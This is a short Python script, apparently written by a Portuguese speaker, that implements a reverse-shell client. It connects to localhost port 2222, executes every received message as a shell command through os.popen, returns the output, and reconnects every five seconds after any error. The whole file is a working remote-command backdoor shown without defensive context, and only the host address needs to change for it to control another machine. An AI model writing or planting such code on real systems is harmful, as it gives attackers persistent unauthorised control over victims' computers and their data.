from socket import *
import os
import time
from threading import *

while True:
    try:
        cliente = socket(AF_INET, SOCK_STREAM)
        cliente.connect(("localhost", 2222))

        while True:
            msg = cliente.recv(2048).decode()

            if msg == "sair":
                cliente.close()
                break

            resultado = os.popen(msg).read()
            cliente.sendall(resultado.encode())
    except:
        print("Erro!")
        time.sleep(5)
        continue


